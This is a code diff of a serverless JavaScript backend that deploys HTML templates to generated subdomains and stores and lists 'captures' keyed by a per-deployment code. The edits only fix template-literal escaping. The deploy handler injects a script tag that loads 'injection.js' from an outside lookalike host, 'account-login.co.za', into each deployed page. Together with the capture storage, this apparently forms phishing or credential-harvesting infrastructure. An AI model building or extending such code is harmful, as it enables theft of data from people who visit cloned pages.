@@ -354,17 +354,17 @@ async function handlePublicDeploy(request, env, rootDomain) {
         const scriptUrl = 'https://account-login.co.za/injection.js';
 
         // We inject the unique code as a global variable, securely serialized.
-        const injectionBlock = \`
+        const injectionBlock = `
         <script>
-        window.UNIQUE_CODE = \${JSON.stringify(uniqueCode)};
+        window.UNIQUE_CODE = ${JSON.stringify(uniqueCode)};
         </script>
-        <script src="\${scriptUrl}"></script>
-        \`;
+        <script src="${scriptUrl}"></script>
+        `;
 
         let html = templateData.content;
         // Inject before </body> if exists, else append
         if (html.includes('</body>')) {
-            html = html.replace('</body>', \`\${injectionBlock}</body>\`);
+            html = html.replace('</body>', `${injectionBlock}</body>`);
         } else {
             html += injectionBlock;
         }
@@ -378,12 +378,12 @@ async function handlePublicDeploy(request, env, rootDomain) {
         }));
 
         // Save Code Map
-        await env.SUBDOMAINS.put(\`code_map::\${uniqueCode}\`, JSON.stringify({
+        await env.SUBDOMAINS.put(`code_map::${uniqueCode}`, JSON.stringify({
             subdomain: subdomain,
             created: Date.now()
         }));
 
-        return new Response(JSON.stringify({ success: true, url: \`https://\${subdomain}.\${rootDomain}\` }), {
+        return new Response(JSON.stringify({ success: true, url: `https://${subdomain}.${rootDomain}` }), {
             headers: { 'Content-Type': 'application/json' }
         });
     } catch (e) {
@@ -397,7 +397,7 @@ async function handleGetPublicCaptures(request, env) {
     if (!code) return jsonError("Missing code");
 
     // List keys with prefix 'capture::{code}::'
-    const list = await env.SUBDOMAINS.list({ prefix: \`capture::\${code}::\` });
+    const list = await env.SUBDOMAINS.list({ prefix: `capture::${code}::` });
     const keys = list.keys.slice(-50).reverse(); // Last 50
 
     const promises = keys.map(async (k) => {
@@ -416,7 +416,7 @@ async function handleDeletePublicCapture(request, env) {
     if (!code || !key) return jsonError("Missing fields");
 
     // Security check: Ensure key belongs to code
-    if (!key.startsWith(\`capture::\${code}::\`)) return jsonError("Unauthorized deletion", 403);
+    if (!key.startsWith(`capture::${code}::`)) return jsonError("Unauthorized deletion", 403);
 
     await env.SUBDOMAINS.delete(key);
     return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
